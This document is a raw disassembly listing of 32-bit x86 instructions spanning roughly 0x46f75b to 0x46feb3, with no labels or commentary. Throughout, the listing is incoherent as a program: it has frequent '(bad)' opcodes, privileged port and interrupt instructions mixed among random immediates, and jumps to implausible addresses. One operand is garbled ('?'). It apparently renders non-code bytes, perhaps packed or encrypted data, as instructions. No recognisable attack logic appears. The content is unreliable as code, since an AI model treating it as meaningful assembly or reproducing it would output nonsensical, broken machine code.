  46f75b:	add    ah,BYTE PTR [ecx-0x140b6fc1]
  46f761:	dec    ebx
  46f762:	sub    eax,0x9ddfc238
  46f767:	mov    ecx,DWORD PTR ds:0x241c8b2f
  46f76d:	mov    DWORD PTR [ecx+edx*4-0xc],ebx
  46f771:	mov    DWORD PTR [esi-0x24723b53],esi
  46f777:	adc    BYTE PTR ds:0x3519ebb2,cl
  46f77d:	sbb    eax,0x5923c43f
  46f782:	pop    edx
  46f783:	lahf   
  46f784:	push   ecx
  46f785:	mov    ecx,esp
  46f787:	push   es
  46f788:	and    al,0x5
  46f78a:	aaa    
  46f78b:	loop   0x46f7cc
  46f78d:	mov    DWORD PTR [ecx],edx
  46f78f:	jmp    0x46f7a9
  46f791:	mov    edx,DWORD PTR [ecx]
  46f793:	test   BYTE PTR [ebx],bh
  46f795:	ret    0x3c72
  46f798:	sbb    DWORD PTR [edx+0x3ef7b5d],eax
  46f79e:	push   ebx
  46f79f:	or     al,0x10
  46f7a1:	sbb    eax,0xba321222
  46f7a6:	inc    ecx
  46f7a7:	cmp    edx,DWORD PTR [ecx]
  46f7a9:	repnz cld 
  46f7ab:	enter  0x1e3,0x7b
  46f7af:	jno    0x46f80f
  46f7b1:	add    DWORD PTR [ebx+0x5f75a01],ecx
  46f7b7:	jmp    DWORD PTR [edi-0x167c357a]
  46f7bd:	add    al,0x8d
  46f7bf:	sbb    al,0x1
  46f7c1:	mov    DWORD PTR [esi],ebx
  46f7c3:	cmp    edx,0x10
  46f7c6:	jl     0x46f7db
  46f7c8:	les    esi,FWORD PTR [esi+0x1f]
  46f7cb:	push   esi
  46f7cc:	call   0xe84dfa98
  46f7d1:	mov    edx,ecx
  46f7d3:	or     al,0x10
  46f7d5:	and    BYTE PTR [esi+ebp*1+0x66],cl
  46f7d9:	cmc    
  46f7da:	push   ss
  46f7db:	loope  0x46f7e1
  46f7dd:	jl     0x46f7ee
  46f7df:	jbe    0x46f7aa
  46f7e1:	add    ch,BYTE PTR [ecx+ecx*4]
  46f7e4:	inc    edi
  46f7e5:	or     BYTE PTR [edx+0x2c7e1dec],bl
  46f7eb:	inc    DWORD PTR ds:0x83d0cfb0
  46f7f1:	jmp    0xcee:0xfcead004
  46f7f8:	aas    
  46f7f9:	xchg   DWORD PTR [eax+0x14],ecx
  46f7fc:	add    DWORD PTR ds:0x7c1583b4,edx
  46f802:	mov    esi,0xdfabdf7c
  46f807:	je     0x46f815
  46f809:	jl     0x46f819
  46f80b:	or     edx,0x2
  46f80e:	ins    BYTE PTR es:[edi],dx
  46f80f:	rol    BYTE PTR [eax+ebp*1],0xe
  46f813:	pusha  
  46f814:	fwait
  46f815:	or     ah,ch
  46f817:	ins    DWORD PTR es:[edi],dx
  46f818:	call   DWORD PTR [ebx+0x2083c203]
  46f81e:	inc    bl
  46f820:	push   ebx
  46f821:	push   esi
  46f822:	push   ecx
  46f823:	xchg   ecx,eax
  46f824:	xor    ah,cl
  46f826:	std    
  46f827:	dec    esp
  46f828:	sub    DWORD PTR [esi-0x7f],0xe9740bf9
  46f82f:	add    al,0xda
  46f831:	and    ebx,0xd6fd7b0c
  46f837:	leave  
  46f838:	sub    ebp,DWORD PTR [esi-0x8eecc38]
  46f83e:	ret    0xf0fe
  46f841:	aas    
  46f842:	add    eax,0xff72af19
  46f847:	test   BYTE PTR [ecx],0x1
  46f84a:	je     0x46f875
  46f84c:	mov    edi,DWORD PTR [edx+esi*2+0x8]
  46f850:	sub    eax,esi
  46f852:	call   DWORD PTR [edx-0x7a]
  46f855:	std    
  46f856:	xor    edi,DWORD PTR [ebx]
  46f858:	jo     0x46f862
  46f85a:	xchg   DWORD PTR [esi],eax
  46f85c:	add    DWORD PTR ds:0xddfd034c,ecx
  46f862:	sbb    BYTE PTR [edx-0x10613b22],ch
  46f868:	fdiv   DWORD PTR [ebx]
  46f86a:	test   BYTE PTR [ebx-0x1eff56fd],0x6d
  46f871:	xchg   ebx,ebx
  46f873:	fisttp DWORD PTR [ebx]
  46f875:	and    eax,0xd803a8c1
  46f87a:	and    ch,BYTE PTR [eax-0x40e78afe]
  46f880:	sbb    ebx,DWORD PTR [ebp-0x28]
  46f883:	sub    BYTE PTR [ebx+0xe],ah
  46f886:	inc    esi
  46f887:	xor    eax,0x8bfe2383
  46f88c:	(bad)  
  46f88d:	pop    edx
  46f88e:	loopne 0x46f8b3
  46f890:	scas   al,BYTE PTR es:[edi]
  46f891:	adc    esp,DWORD PTR [edi-0x24cca70c]
  46f897:	div    DWORD PTR [edx+ebx*1-0x1ff2d0c5]
  46f89e:	jecxz  0x46f8ee
  46f8a0:	(bad)  
  46f8a1:	in     eax,0x80
  46f8a3:	sub    eax,0x78812f5a
  46f8a8:	add    al,0xc7
  46f8aa:	mov    WORD PTR [esi+0x76],?
  46f8ad:	rol    ebx,0x3f
  46f8b0:	scas   al,BYTE PTR es:[edi]
  46f8b1:	ror    BYTE PTR [ebp-0x2ed4d1f4],1
  46f8b7:	xor    bh,BYTE PTR [edi-0x24]
  46f8ba:	lock sub esi,ebp
  46f8bd:	push   0x77
  46f8bf:	sar    esi,1
  46f8c1:	(bad)  
  46f8c2:	sub    eax,edi
  46f8c4:	cmp    eax,0xc
  46f8c7:	jge    0x46f8df
  46f8c9:	push   ecx
  46f8ca:	aad    0x2b
  46f8cc:	push   eax
  46f8cd:	dec    eax
  46f8ce:	(bad)  
  46f8cf:	mov    al,0xc7
  46f8d1:	xchg   esi,eax
  46f8d2:	out    dx,eax
  46f8d3:	xchg   DWORD PTR [esi+0x4ae00ac2],esp
  46f8d9:	adc    al,0xd6
  46f8db:	xor    BYTE PTR [ebp-0x40defbbb],cl
  46f8e1:	or     dl,BYTE PTR [edx+eiz*8-0x75]
  46f8e5:	cmp    al,0x24
  46f8e7:	xchg   esi,eax
  46f8e8:	cmp    ah,al
  46f8ea:	aad    0xdd
  46f8ec:	push   cs
  46f8ed:	and    al,0xb0
  46f8ef:	jns    0x46f8c0
  46f8f1:	jo     0x46f8a0
  46f8f3:	jp     0x46f941
  46f8f5:	mov    edx,0xb803c751
  46f8fa:	mov    ebx,0xd0eb0df6
  46f8ff:	jbe    0x46f90b
  46f901:	lea    edx,[edx+ecx*8]
  46f904:	rol    BYTE PTR [ebx-0x7c],1
  46f907:	mov    edx,esp
  46f909:	mov    ch,0x2c
  46f90b:	inc    edx
  46f90c:	lds    eax,FWORD PTR [ebx]
  46f90e:	pop    ecx
  46f90f:	mov    bl,0xf0
  46f911:	ret    
  46f912:	or     ebx,eax
  46f914:	loopne 0x46f962
  46f916:	adc    BYTE PTR [esi+0x53],dh
  46f919:	mov    DWORD PTR [ebx+ecx*8],esi
  46f91c:	mov    DWORD PTR [eax+0x2e],ebx
  46f91f:	inc    ebp
  46f920:	mov    dh,0xb5
  46f922:	mov    bl,0x3
  46f924:	cmp    al,0xe8
  46f926:	or     al,0x14
  46f928:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  46f929:	sti    
  46f92a:	jbe    0x46f8f7
  46f92c:	mov    ch,0x39
  46f92e:	ficomp DWORD PTR [ebp+eax*4-0x40]
  46f932:	jo     0x46f8f4
  46f934:	clc    
  46f935:	add    ah,cl
  46f937:	fidivr WORD PTR ds:0xdc2e01c2
  46f93d:	mov    edx,0x37423cb
  46f942:	test   al,0xb1
  46f944:	sub    esi,esi
  46f946:	or     al,0x80
  46f948:	cmp    DWORD PTR [esi+0x60],0x9611454b
  46f94f:	adc    DWORD PTR [ecx],edx
  46f951:	pop    edi
  46f952:	mov    esi,DWORD PTR [esi-0x3d]
  46f955:	and    BYTE PTR [ebp-0x5b105255],bh
  46f95b:	push   ecx
  46f95c:	xchg   edx,eax
  46f95d:	or     ch,dh
  46f95f:	or     BYTE PTR [esi-0x6],dl
  46f962:	cmp    al,0x9d
  46f964:	cmp    BYTE PTR [ebx],dl
  46f966:	ss jl  0x46f976
  46f969:	leave  
  46f96a:	pcmpgtb mm6,QWORD PTR [eax+0x41]
  46f96e:	cmp    eax,eax
  46f970:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  46f972:	mov    eax,ds:0xaf9925e7
  46f977:	inc    al
  46f979:	and    BYTE PTR [eax+esi*8],dl
  46f97c:	outs   dx,BYTE PTR ds:[esi]
  46f97d:	cmp    DWORD PTR ds:0xec868e18,0x3
  46f984:	mov    bh,BYTE PTR [esi+0x40]
  46f987:	adc    edx,esi
  46f989:	or     al,0x3f
  46f98b:	out    dx,al
  46f98c:	pusha  
  46f98d:	in     eax,0x6d
  46f98f:	pop    es
  46f990:	es add bl,ch
  46f993:	sub    esp,DWORD PTR [ecx+0x1cd8c883]
  46f999:	fld    QWORD PTR [ecx]
  46f99b:	inc    edx
  46f99c:	in     al,0x54
  46f99e:	mov    BYTE PTR ds:0x15c68079,cl
  46f9a4:	fdivr  QWORD PTR [ecx-0x70b4f3e3]
  46f9aa:	clc    
  46f9ab:	pop    esi
  46f9ac:	shl    eax,1
  46f9ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  46f9af:	test   BYTE PTR [ebp-0x745a5ad4],cl
  46f9b5:	cld    
  46f9b6:	dec    eax
  46f9b7:	adc    DWORD PTR [eax],ebx
  46f9b9:	je     0x46f99b
  46f9bb:	add    BYTE PTR [edi+0x75],cl
  46f9be:	inc    ebx
  46f9bf:	mov    ecx,0x8d685ddd
  46f9c4:	rcl    DWORD PTR [edx-0xc],0xd8
  46f9c8:	jae    0x46f9d4
  46f9ca:	xchg   edi,eax
  46f9cb:	lods   al,BYTE PTR ds:[esi]
  46f9cc:	stos   DWORD PTR es:[edi],eax
  46f9cd:	(bad)  
  46f9ce:	sbb    dh,ah
  46f9d0:	sub    DWORD PTR [edi],eax
  46f9d2:	add    DWORD PTR [edi+0x0],eax
  46f9d5:	add    ecx,DWORD PTR [eax]
  46f9d7:	repz add esi,DWORD PTR [esp+0x64]
  46f9dc:	(bad)  
  46f9dd:	jae    0x46fa14
  46f9df:	jle    0x46f9b9
  46f9e1:	push   ss
  46f9e2:	inc    edi
  46f9e3:	(bad)  
  46f9e5:	sub    eax,0x1175f03b
  46f9ea:	add    DWORD PTR [esi],0xffffff83
  46f9ed:	sti    
  46f9ee:	test   DWORD PTR [eax-0x35],esp
  46f9f1:	into   
  46f9f2:	rol    DWORD PTR cs:[ebx+0x332046f],cl
  46f9f9:	nop
  46f9fa:	sbb    ebx,DWORD PTR [edi]
  46f9fc:	fmul   DWORD PTR [ebx+0x1b0053c]
  46fa02:	xor    al,0xc1
  46fa04:	inc    ebp
  46fa05:	pop    es
  46fa06:	sub    eax,0xd470c8bf
  46fa0b:	lea    eax,[ebx+0x59]
  46fa0e:	outs   dx,BYTE PTR ds:[esi]
  46fa0f:	sub    al,0x2a
  46fa11:	mov    eax,0x2683f408
  46fa16:	add    BYTE PTR [edx-0x173d3b75],ah
  46fa1c:	mov    al,0xd0
  46fa1e:	enter  0x6411,0x2
  46fa22:	mov    es,WORD PTR [esi]
  46fa24:	stc    
  46fa25:	fimul  DWORD PTR [esi-0x7243b890]
  46fa2b:	push   esi
  46fa2c:	test   al,0xc3
  46fa2e:	pusha  
  46fa2f:	or     DWORD PTR [edi+eax*1-0x40f72650],ebx
  46fa36:	push   ecx
  46fa37:	mov    ah,0x98
  46fa39:	or     al,BYTE PTR [edx]
  46fa3b:	ins    BYTE PTR es:[edi],dx
  46fa3c:	xor    eax,0x2d3d1f1d
  46fa41:	jg     0x46fa5c
  46fa43:	lahf   
  46fa44:	adc    esp,DWORD PTR [ecx-0x7eb3049d]
  46fa4a:	hlt    
  46fa4b:	cmp    BYTE PTR [ebx+0x1908243a],al
  46fa51:	out    0x62,eax
  46fa53:	inc    ebx
  46fa54:	lods   al,BYTE PTR ds:[esi]
  46fa55:	jmp    0x47a0fce5
  46fa5a:	int    0x8
  46fa5c:	mov    edi,0xd06c3a21
  46fa61:	jno    0x46fa20
  46fa63:	jne    0x46fa06
  46fa65:	or     al,0xbf
  46fa67:	push   es
  46fa68:	popf   
  46fa69:	pop    ss
  46fa6a:	jb     0x46fa02
  46fa6c:	mov    eax,0xabab8e0f
  46fa71:	sbb    eax,0xc885d820
  46fa76:	pop    esi
  46fa77:	imul   esp,DWORD PTR [eax],0x5a89169a
  46fa7d:	or     BYTE PTR [eax],cl
  46fa7f:	mov    edx,0x682a46b2
  46fa84:	pop    edx
  46fa85:	push   ss
  46fa86:	push   ss
  46fa87:	cmp    edi,DWORD PTR [edi+0x62]
  46fa8a:	pop    ss
  46fa8b:	jbe    0x46fae9
  46fa8d:	push   esp
  46fa8e:	mov    ebx,ebx
  46fa90:	popw   es
  46fa92:	je     0x46fae8
  46fa94:	cwde   
  46fa95:	jbe    0x46fae8
  46fa97:	push   cs
  46fa98:	push   cs
  46fa99:	scas   al,BYTE PTR es:[edi]
  46fa9a:	ins    DWORD PTR es:[edi],dx
  46fa9b:	pop    ds
  46fa9c:	xchg   DWORD PTR [edx],edx
  46fa9e:	push   eax
  46fa9f:	add    BYTE PTR [ebx+0x1a60f43e],0x88
  46faa6:	lock in eax,dx
  46faa8:	inc    edi
  46faa9:	dec    esi
  46faaa:	jp     0x46fab6
  46faac:	jmp    0x46fabc
  46faae:	adc    eax,ebp
  46fab0:	cmp    ebx,DWORD PTR [ebp+0x4e]
  46fab3:	mov    DWORD PTR [eax],edi
  46fab5:	xor    ebp,DWORD PTR ds:0x830829b6
  46fabb:	jge    0x46faa5
  46fabd:	pop    eax
  46fabe:	adc    BYTE PTR [ebx+ecx*4],dh
  46fac1:	pxor   mm7,QWORD PTR [eax]
  46fac4:	push   cs
  46fac5:	sbb    al,0xad
  46fac7:	add    DWORD PTR ds:0xe0f8c3b3,ebx
  46facd:	push   ss
  46face:	addr16 pop ds
  46fad0:	cdq    
  46fad1:	or     ch,BYTE PTR [eax]
  46fad3:	bnd jl 0x46faaf
  46fad6:	push   es
  46fad7:	mov    eax,0xeb83d513
  46fadc:	inc    esi
  46fadd:	mov    ebx,0x9f669eb
  46fae2:	mov    al,0x2
  46fae4:	jae    0x46fb0f
  46fae6:	push   es
  46fae7:	cli    
  46fae8:	mov    eax,edx
  46faea:	and    bh,BYTE PTR [ebx]
  46faec:	pusha  
  46faed:	aaa    
  46faee:	pop    esi
  46faef:	cmp    BYTE PTR [esp+ecx*1-0x6],0xd3
  46faf4:	xchg   edx,eax
  46faf5:	imul   ebp,ebx,0xf06671e
  46fafb:	dec    esi
  46fafc:	scas   al,BYTE PTR es:[edi]
  46fafd:	dec    eax
  46fafe:	jne    0x46fb07
  46fb00:	lahf   
  46fb01:	or     BYTE PTR [ebx+ebx*1],0x60
  46fb05:	xchg   ebp,eax
  46fb06:	dec    esp
  46fb07:	mov    al,0x75
  46fb09:	ficomp WORD PTR [edx+ebp*4]
  46fb0c:	shr    DWORD PTR [edx-0x612ae6c3],1
  46fb12:	pop    edi
  46fb13:	or     al,BYTE PTR [esi-0x13f8ef53]
  46fb19:	push   ebx
  46fb1a:	mov    ss,ebp
  46fb1c:	cmp    al,0x10
  46fb1e:	loope  0x46fb2d
  46fb20:	adc    al,dh
  46fb22:	or     esi,DWORD PTR [esp+esi*2-0x61]
  46fb26:	or     eax,0xf85a700e
  46fb2b:	outs   dx,BYTE PTR ds:[esi]
  46fb2c:	jle    0x46fb05
  46fb2e:	inc    ebp
  46fb2f:	cld    
  46fb30:	adc    eax,0xf2615573
  46fb35:	adc    BYTE PTR [eax],cl
  46fb37:	jo     0x46fb5e
  46fb39:	cmp    edi,DWORD PTR [esi*4-0x3c7cc01f]
  46fb40:	pop    es
  46fb41:	and    ebx,0xfffffffc
  46fb44:	cmp    ebx,0x12
  46fb47:	add    eax,0x505eeabb
  46fb4c:	fnsave [ebx]
  46fb4e:	(bad)  
  46fb4f:	jg     0x56301201
  46fb55:	clc    
  46fb56:	pusha  
  46fb57:	retf   0x1a01
  46fb5a:	jb     0x46fb54
  46fb5c:	stos   BYTE PTR es:[edi],al
  46fb5d:	mov    DWORD PTR [eax],ebx
  46fb5f:	mov    ebx,DWORD PTR [ebx+0x60]
  46fb62:	dec    ebp
  46fb63:	fsub   DWORD PTR [edx]
  46fb65:	in     al,dx
  46fb66:	push   cs
  46fb67:	sub    BYTE PTR [edx],ah
  46fb69:	(bad)  
  46fb6a:	sbb    cl,BYTE PTR [eax+0x2b]
  46fb6d:	les    esi,FWORD PTR [esi-0xf0fe397]
  46fb73:	cmp    edx,DWORD PTR [esi]
  46fb75:	jne    0x46fb85
  46fb77:	aaa    
  46fb78:	das    
  46fb79:	adc    eax,0x26ebdbdc
  46fb7e:	xchg   DWORD PTR [ebp-0x10],ecx
  46fb81:	sbb    eax,0x76f40ec1
  46fb86:	in     eax,dx
  46fb87:	or     al,0x71
  46fb89:	pop    edx
  46fb8a:	inc    edi
  46fb8b:	ins    BYTE PTR es:[edi],dx
  46fb8c:	mov    edx,0x1d2c3010
  46fb91:	out    dx,al
  46fb92:	lock test esp,ebp
  46fb95:	pop    ss
  46fb96:	xor    BYTE PTR [edx-0x4de9f0d2],dh
  46fb9c:	and    DWORD PTR [eax],0x2d
  46fb9f:	inc    ebp
  46fba0:	cld    
  46fba1:	test   BYTE PTR [esi],ch
  46fba3:	fs aad 0xbb
  46fba6:	mov    DWORD PTR [edi],0x991d3bd1
  46fbac:	jg     0x46fc01
  46fbae:	sub    DWORD PTR [edi],ecx
  46fbb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  46fbb1:	mov    ebx,0xd0ef558
  46fbb6:	add    ebx,DWORD PTR ds:0xc7b6c551
  46fbbc:	test   eax,0xbbc38ab6
  46fbc1:	jmp    0x46fbf5
  46fbc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  46fbc4:	and    al,0x87
  46fbc6:	adc    DWORD PTR [edi],esi
  46fbc8:	mov    BYTE PTR [esi],bh
  46fbca:	pop    edi
  46fbcb:	ja     0x46fbf2
  46fbcd:	shl    edx,0xe4
  46fbd0:	jnp    0x8ba2f81b
  46fbd6:	in     eax,0xf0
  46fbd8:	push   esi
  46fbd9:	add    bh,BYTE PTR ds:0xb7af0a19
  46fbdf:	gs pop ds
  46fbe1:	jne    0x46fbf9
  46fbe3:	loop   0x46fb7b
  46fbe5:	cmp    BYTE PTR [ebx-0x19],dh
  46fbe8:	or     BYTE PTR [esi+0xc],ah
  46fbeb:	lock adc eax,0x176cf2b2
  46fbf1:	dec    edx
  46fbf2:	inc    edi
  46fbf3:	daa    
  46fbf4:	mov    DWORD PTR [ebp-0x8],ebx
  46fbf7:	sti    
  46fbf8:	mov    ebx,0x2c42eb81
  46fbfd:	push   0x11
  46fbff:	mov    ebx,DWORD PTR [eax]
  46fc01:	test   bl,0x2
  46fc04:	jne    0x46fc15
  46fc06:	cdq    
  46fc07:	test   BYTE PTR [esi-0x8],dl
  46fc0a:	or     DWORD PTR ss:[ebx+0x330dff1a],ecx
  46fc11:	ret    
  46fc12:	mov    esi,0x9b67c19b
  46fc17:	push   esi
  46fc18:	sub    DWORD PTR ds:0x740152ab,eax
  46fc1e:	push   ebx
  46fc1f:	jns    0x46fc2d
  46fc21:	ins    DWORD PTR es:[edi],dx
  46fc22:	test   BYTE PTR [edi+0x762c31c],cl
  46fc28:	test   eax,0x5a7dea03
  46fc2d:	icebp  
  46fc2e:	and    cl,al
  46fc30:	or     bl,BYTE PTR [edx+0x1499d02b]
  46fc36:	mov    WORD PTR es:[esi-0x28],fs
  46fc3a:	cmp    eax,0x57176238
  46fc3f:	js     0x46fc3b
  46fc41:	std    
  46fc42:	lock or DWORD PTR [ebx],ebp
  46fc45:	lods   al,BYTE PTR ds:[esi]
  46fc46:	add    edi,DWORD PTR [eax+edi*4-0x3d]
  46fc4a:	xchg   ecx,eax
  46fc4b:	ret    
  46fc4c:	cmp    eax,DWORD PTR ds:0x292c75cd
  46fc52:	fld    QWORD PTR [ecx]
  46fc54:	adc    BYTE PTR [edi],0x58
  46fc57:	pop    esi
  46fc58:	xor    DWORD PTR [ecx+0x31057eaa],eax
  46fc5e:	pop    eax
  46fc5f:	jno    0x46fc45
  46fc61:	dec    ebx
  46fc62:	push   ebp
  46fc63:	(bad)  
  46fc64:	lock sub esi,DWORD PTR [eax-0x7e]
  46fc68:	out    dx,eax
  46fc69:	sbb    eax,DWORD PTR [eax]
  46fc6b:	test   al,0x2
  46fc6d:	je     0x46fc8d
  46fc6f:	addr16 clc 
  46fc71:	add    al,0x2b
  46fc73:	lahf   
  46fc74:	jbe    0x46fc75
  46fc76:	sahf   
  46fc77:	or     ecx,DWORD PTR [esi+0x3c]
  46fc7a:	or     DWORD PTR [eax],0x1
  46fc7d:	jmp    0x46fcbb
  46fc7f:	push   cs
  46fc80:	repnz lock cmp DWORD PTR [eax+0x5f],0x37
  46fc86:	outs   dx,BYTE PTR ds:[esi]
  46fc87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  46fc88:	add    al,0xa
  46fc8a:	adc    BYTE PTR [edx+0xe082109],al
  46fc90:	push   es
  46fc91:	ja     0x46fc43
  46fc93:	or     al,0x67
  46fc95:	sbb    ch,BYTE PTR [eax]
  46fc97:	into   
  46fc98:	pop    ebx
  46fc99:	mov    eax,0x59a98357
  46fc9e:	rol    DWORD PTR [esi+0x3d],cl
  46fca1:	mov    eax,ds:0x39003449
  46fca6:	push   eax
  46fca7:	lods   eax,DWORD PTR ds:[esi]
  46fca8:	dec    esi
  46fca9:	daa    
  46fcaa:	sbb    al,0x42
  46fcac:	push   ebx
  46fcad:	cmp    bh,BYTE PTR [edi+0x784dca7d]
  46fcb3:	clc    
  46fcb4:	das    
  46fcb5:	loope  0x46fc42
  46fcb7:	xor    BYTE PTR [ecx-0x3969e01a],al
  46fcbd:	mov    al,0x6f
  46fcbf:	xlat   BYTE PTR ds:[ebx]
  46fcc0:	push   esi
  46fcc1:	retf   
  46fcc2:	cmp    esi,ebx
  46fcc4:	or     dh,BYTE PTR [eax+0x4f199201]
  46fcca:	adc    al,0x61
  46fccc:	stos   DWORD PTR es:[edi],eax
  46fccd:	sub    eax,DWORD PTR ds:0x2bee90ae
  46fcd3:	jmp    0x46fcc4
  46fcd5:	cmp    edx,DWORD PTR ds:0xb97457d4
  46fcdb:	push   ecx
  46fcdc:	sub    eax,0x8d0f832d
  46fce1:	outs   dx,DWORD PTR ds:[esi]
  46fce2:	scas   al,BYTE PTR es:[edi]
  46fce3:	out    dx,al
  46fce4:	in     eax,0x2b
  46fce6:	push   cs
  46fce7:	add    DWORD PTR [ecx],esi
  46fce9:	sub    DWORD PTR [ebx-0x74cd7822],ecx
  46fcef:	add    al,0x72
  46fcf1:	inc    edx
  46fcf2:	sbb    al,0xf6
  46fcf4:	add    BYTE PTR [esi],bh
  46fcf6:	adc    DWORD PTR [ecx+0x15],eax
  46fcf9:	pop    ds
  46fcfa:	mov    esp,0xd68d082
  46fcff:	aad    0x83
  46fd01:	std    
  46fd02:	mov    eax,0xcb5b7d23
  46fd07:	or     bl,BYTE PTR [ebx+0x5102cdfd]
  46fd0d:	sub    ah,bh
  46fd0f:	not    BYTE PTR [esi]
  46fd11:	ror    DWORD PTR [ebx],0x95
  46fd14:	cdq    
  46fd15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  46fd16:	mov    edi,ebx
  46fd18:	sub    edi,esi
  46fd1a:	fisttp WORD PTR [edi]
  46fd1c:	pop    esi
  46fd1d:	mov    eax,ds:0x73b6571
  46fd22:	jg     0x46fd73
  46fd24:	sub    DWORD PTR [edi],ecx
  46fd26:	add    DWORD PTR [esi+0x3dd35ef7],esp
  46fd2c:	sbb    al,0xb3
  46fd2e:	sbb    BYTE PTR [ecx+0x2cc95327],ah
  46fd34:	sub    ch,0xb1
  46fd37:	(bad)  [ebx]
  46fd39:	(bad)  
  46fd3a:	sub    al,0x67
  46fd3c:	loopne 0x46fd49
  46fd3e:	jnp    0x46fd94
  46fd40:	xchg   esi,eax
  46fd41:	and    eax,0xb0d80bb5
  46fd46:	sbb    BYTE PTR [ecx],ch
  46fd48:	fdiv   DWORD PTR [eax-0x4f]
  46fd4b:	std    
  46fd4c:	out    dx,eax
  46fd4d:	das    
  46fd4e:	mov    DWORD PTR [eax],eax
  46fd50:	aas    
  46fd51:	les    edx,FWORD PTR [eax+0x86a904f]
  46fd57:	cmp    edi,ebp
  46fd59:	push   cs
  46fd5a:	shr    DWORD PTR [edx-0x49],0x8e
  46fd5e:	add    eax,ebp
  46fd60:	inc    ebx
  46fd61:	sub    edi,ebp
  46fd63:	push   es
  46fd64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  46fd65:	sub    ebp,edi
  46fd67:	std    
  46fd68:	add    DWORD PTR [edi],ebp
  46fd6a:	or     eax,0xd58b0ea9
  46fd6f:	retf   
  46fd70:	dec    edi
  46fd71:	add    ebx,ebp
  46fd73:	jl     0x46fd56
  46fd75:	xor    al,0xe0
  46fd77:	pop    ds
  46fd78:	mov    bl,0xeb
  46fd7a:	cmp    ebp,DWORD PTR [ebx]
  46fd7c:	fdivr  QWORD PTR [ebx-0x35]
  46fd7f:	dec    ebx
  46fd80:	lahf   
  46fd81:	sub    al,cl
  46fd83:	sub    dl,bh
  46fd85:	aaa    
  46fd86:	xor    BYTE PTR [edx+0x12680366],al
  46fd8c:	sbb    al,0xe
  46fd8e:	adc    eax,DWORD PTR [esi]
  46fd90:	add    eax,0x18387845
  46fd95:	sub    dl,dh
  46fd97:	sbb    eax,0x68323885
  46fd9c:	add    eax,0x812170d
  46fda1:	xor    dl,BYTE PTR [edi+eiz*1+0x7c]
  46fda5:	scas   eax,DWORD PTR es:[edi]
  46fda6:	adc    eax,DWORD PTR [edx-0x4a]
  46fda9:	cmp    dl,BYTE PTR [eax*1+0x1597181a]
  46fdb0:	sub    dl,BYTE PTR [ebp+0x7]
  46fdb3:	jg     0x46fd72
  46fdb5:	mov    edx,esi
  46fdb7:	ret    
  46fdb8:	pop    ss
  46fdb9:	push   esp
  46fdba:	sbb    al,BYTE PTR ds:0x9c25fcb0
  46fdc0:	ss (bad) 
  46fdc2:	jmp    0x46fe01
  46fdc4:	fist   DWORD PTR [ebx]
  46fdc6:	sar    BYTE PTR [ecx+0x5585db0e],1
  46fdcc:	add    ecx,DWORD PTR [ebx+eax*4+0x38027d16]
  46fdd3:	mov    esi,0xfc00f80f
  46fdd8:	je     0x46fdec
  46fdda:	fmul   st,st(3)
  46fddc:	xchg   ecx,eax
  46fddd:	push   eax
  46fdde:	sbb    al,0x44
  46fde0:	inc    eax
  46fde1:	xor    al,0x3a
  46fde3:	jecxz  0x46fe63
  46fde5:	shr    BYTE PTR [esi-0x5efb7e65],1
  46fdeb:	in     al,0x1c
  46fded:	sub    cl,BYTE PTR [edx+ebp*4-0x7200484e]
  46fdf4:	xchg   eax,ebx
  46fdf6:	test   ebx,ebx
  46fdf8:	jle    0x46fe14
  46fdfa:	nop
  46fdfb:	call   DWORD PTR ds:0xec50603c
  46fe01:	int    0xbf
  46fe03:	xor    BYTE PTR [esi-0x4ff18af6],al
  46fe09:	add    DWORD PTR [ebx],ebx
  46fe0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  46fe0c:	jmp    0x46fe13
  46fe0e:	stos   BYTE PTR es:[edi],al
  46fe0f:	sub    ebx,DWORD PTR [eax-0x185076e5]
  46fe15:	test   DWORD PTR [ebp+edx*1+0x54],edx
  46fe19:	xor    DWORD PTR [esi-0x11],esp
  46fe1c:	dec    esi
  46fe1d:	inc    eax
  46fe1e:	jno    0x46fe94
  46fe20:	or     esi,DWORD PTR [eax-0x3fdb0fe]
  46fe26:	imul   edi,edi,0xa2c346ef
  46fe2c:	or     BYTE PTR [ebp-0x7acd8b37],al
  46fe32:	shl    BYTE PTR [eax+ebx*1+0x50],cl
  46fe36:	mov    eax,ecx
  46fe38:	dec    esi
  46fe39:	inc    esp
  46fe3a:	or     DWORD PTR [esi+esi*8+0x640959f6],edx
  46fe41:	sbb    DWORD PTR [ecx-0x16ad3cff],ecx
  46fe47:	ds jns 0x46fe95
  46fe4a:	fcmovnu st,st(6)
  46fe4c:	xor    BYTE PTR [ecx+0x2aeb752e],al
  46fe52:	add    DWORD PTR [edx+0x10],esp
  46fe55:	ficomp WORD PTR [ebp+0x3cd0a693]
  46fe5b:	out    0xde,eax
  46fe5d:	mov    eax,0x2c1df951
  46fe62:	stos   BYTE PTR es:[edi],al
  46fe63:	repnz mov eax,0x1b0f9698
  46fe69:	mov    eax,DWORD PTR [eax+0x4ae0b60e]
  46fe6f:	mov    dl,0xc3
  46fe71:	xor    al,0xc3
  46fe73:	push   ecx
  46fe74:	inc    ecx
  46fe75:	adc    ebx,DWORD PTR [ebx-0x7f]
  46fe78:	aad    0x40
  46fe7a:	and    DWORD PTR [edi+0x57],edi
  46fe7d:	lods   eax,DWORD PTR ds:[esi]
  46fe7e:	pop    ebp
  46fe7f:	bound  edx,QWORD PTR [edi]
  46fe81:	and    ebx,DWORD PTR [ecx+0x1f0f2148]
  46fe87:	fsubr  DWORD PTR [esi]
  46fe89:	into   
  46fe8a:	push   eax
  46fe8b:	or     BYTE PTR [edi-0x77],dh
  46fe8e:	adc    eax,0x328d6004
  46fe93:	lods   al,BYTE PTR ds:[esi]
  46fe94:	mov    eax,0xc38c33e2
  46fe99:	repz jecxz 0x46feca
  46fe9c:	cmp    eax,0xbd9ac708
  46fea1:	cmp    ebp,DWORD PTR [eax+edx*4]
  46fea4:	jle    0x46febf
  46fea6:	test   bl,bl
  46fea8:	jne    0x46feb7
  46feaa:	(bad)  
  46feab:	cwde   
  46feac:	mov    ebx,0x6407f8ff
  46feb1:	jmp    0x46fec2
  46feb3:	cmp    bl,0x18
